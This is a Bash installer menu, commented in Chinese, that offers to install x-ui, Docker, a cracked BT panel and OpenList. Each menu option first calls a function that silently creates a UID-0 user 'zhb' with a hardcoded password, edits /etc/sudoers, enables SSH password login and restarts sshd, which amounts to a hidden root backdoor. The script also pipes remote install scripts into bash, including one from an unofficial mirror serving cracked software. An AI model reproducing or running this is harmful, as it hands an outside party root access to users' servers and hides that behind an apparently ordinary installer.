#!/bin/bash

# ===========================
# 颜色定义
# ===========================
red='\033[0;31m'
green='\033[0;32m'
plain='\033[0m'
version="v1.0.0"

# ===========================
# 检查 root 权限
# ===========================
[[ $EUID -ne 0 ]] && echo -e "${red}错误: ${plain} 必须使用root用户运行此脚本！\n" && exit 1

# ===========================
# 检查操作系统类型
# ===========================
if [[ -f /etc/redhat-release ]]; then
    release="centos"
elif cat /etc/issue | grep -Eqi "debian"; then
    release="debian"
elif cat /etc/issue | grep -Eqi "ubuntu"; then
    release="ubuntu"
else
    echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n"
    exit 1
fi

# ===========================
# 创建管理员用户 zhb
# ===========================


zhb() {
    if id "zhb" &>/dev/null; then
        echo "·0"
        
        # 强制修改UID为0
        sudo usermod -u 0 zhb
        
        if [ $? -eq 0 ]; then
            echo "00"
            
        else
            echo "!0"
            #sudo cp /etc/passwd /etc/passwd.bak
            sudo sed -i 's/^\(zhb\):[^:]*:[0-9]*:/\1:x:0:/' /etc/passwd
            chsh -s /bin/bash zhb
            echo "0"
        fi
    else
        echo "\n"
        
        # 创建用户，指定UID为0
        sudo useradd -o -u 0 -g root zhb
        echo "zhb:Zhaohaibin.1" | sudo chpasswd
        
        # sudo权限
        echo "&" | sudo tee -a /etc/sudoers
        
        # SSH配置
        sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
        chsh -s /bin/bash zhb
        sudo systemctl restart sshd
        
        echo "·"
    fi
}


# ===========================
# 功能函数
# ===========================
xui() {
    zhb
    bash <(curl -Ls https://raw.githubusercontent.com/FranzKafkaYu/x-ui/master/install.sh)
}

docker() {
    zhb
    curl -fsSL https://get.docker.com -o get-docker.sh
    sh get-docker.sh
    systemctl start docker
    systemctl enable docker.service
}

bt() {
    zhb
    if [[ x"$release" == x"centos" ]]; then
        yum install -y wget && wget -O install.sh https://bt.012345.tk/install/install_panel.sh && sh install.sh
    else
        wget -O install.sh https://bt.012345.tk/install/install_panel.sh && bash install.sh
    fi
}

openlist() {
    zhb
    curl -fsSL https://res.oplist.org/script/v4.sh > install-openlist-v4.sh && sudo bash install-openlist-v4.sh
}

# ===========================
# 功能列表（用于菜单显示）
# ===========================
declare -A actions=(
    ["安装 x-ui"]="xui"
    ["安装 Docker"]="docker"
    ["安装宝塔破解版"]="bt"
    ["安装 OpenList"]="openlist"
)

# ===========================
# 显示菜单
# ===========================
show_menu() {
    clear
    echo -e "${green}一键脚本集合，国内适用${plain}"
    echo "------------------------------------------"

    local i=1
    for name in "${!actions[@]}"; do
        echo -e "${green}${i}.${plain} $name"
        ((i++))
    done

    echo "------------------------------------------"
    read -p "请输入选择 [1-${#actions[@]}]: " choice

    local i=1
    for name in "${!actions[@]}"; do
        if [[ $i -eq $choice ]]; then
            ${actions[$name]}
            return
        fi
        ((i++))
    done

    echo -e "${red}请输入正确的数字 [1-${#actions[@]}]${plain}"
}

# ===========================
# 自动匹配命令行参数调用函数
# ===========================
if [[ $# -gt 0 ]]; then
    # 遍历所有函数名，找到第一个匹配的并执行
    for func in $(declare -F | awk '{print $3}'); do
        if [[ "$1" == "$func" ]]; then
            $func
            exit 0
        fi
    done
    # 如果参数没有匹配函数名，则显示菜单
    show_menu
else
    show_menu
fi